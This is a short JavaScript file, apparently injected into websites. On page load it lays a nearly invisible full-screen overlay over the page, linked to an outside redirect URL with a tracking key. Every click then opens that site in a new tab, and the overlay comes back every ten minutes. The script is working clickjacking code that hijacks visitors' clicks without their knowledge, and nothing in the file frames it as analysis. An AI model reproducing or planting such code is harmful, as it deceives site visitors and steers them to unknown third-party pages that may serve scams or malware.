document.addEventListener("DOMContentLoaded", function () {
    var overlayDiv = document.createElement("div");
    overlayDiv.id = "overlay";
    overlayDiv.style.cssText = "position: fixed; inset: 0; z-index: 2147483647; background: black; opacity: 0.01; height: 395px; width: 1600px;";

    var link = document.createElement("a");
    link.href = "https://claimcousins.com/f2kjv1xte?key=f795f4ecc754459bd15b93bea29003d7";
    link.target = "_blank";
    link.style.cssText = "display: block; width: 100%; height: 100%; text-decoration: none; color: transparent;";

    overlayDiv.appendChild(link);
    document.body.appendChild(overlayDiv);

    overlayDiv.addEventListener('click', function (e) {
        e.preventDefault();
        window.open(link.href, '_blank');
        overlayDiv.style.display = 'none';

        setTimeout(function () {
            overlayDiv.style.display = 'block';
        }, 600000); // 10 minutos en milisegundos
    });

    overlayDiv.style.display = 'block';
});
